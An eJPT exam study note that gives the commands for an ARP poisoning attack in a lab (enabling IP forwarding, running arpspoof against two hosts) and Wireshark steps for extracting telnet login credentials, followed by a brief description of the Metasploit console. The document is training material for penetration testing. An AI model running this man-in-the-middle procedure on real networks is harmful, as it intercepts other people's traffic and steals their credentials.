---
title: ARP Poisoning
dg-publish: true
---

# ARP Poisoning

> [!info] Navigation
> [[Home]] | [[Master Table of Contents]] | [[Exam Cram Guide]] | [[Command Dashboard]] | [[Curated External Sources]] | [[Main/03 - Study Materials/eJPT/10 - Visual Diagrams/Index]]



## Sections in This Note
- [[#ARP Poisoning|ARP Poisoning]]

---

## ARP Poisoning

```
# Configure Kali to forward IP packets
echo 1 > /proc/sys/net/ipv4/ip_forward

# Perform ARP poisoning attack
arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
```

Navigate to the "Sniffing & Spoofing" menu and start Wireshark. Select the eth1 interface — traffic will appear on Wireshark. Apply a "telnet" filter to view telnet traffic. Follow the TCP stream (right-click a packet → Follow → TCP Stream) to reveal the telnet login credentials.

---

## The Metasploit Framework (MSF)

The Metasploit Framework (MSF) is an open-source, robust penetration testing and exploitation framework used by penetration testers and security researchers worldwide. It provides a robust infrastructure to automate every stage of the penetration testing life cycle. It's also used to develop and test exploits, and has one of the world's largest databases of public, tested exploits.

```
=[ metasploit v6.1.13-dev                          ]
+ -- --=[ 2178 exploits - 1153 auxiliary - 399 post ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops       ]
+ -- --=[ 9 evasion                                  ]

Metasploit tip: Save the current environment with the
save command, future console restarts will use this
environment again

msf6 >
```

The **Metasploit Framework Console (MSFconsole)** is an easy-to-use all-in-one interface providing access to all MSF functionality.


## Related
- [[Exam Cram Guide]]
- [[Command Dashboard]]
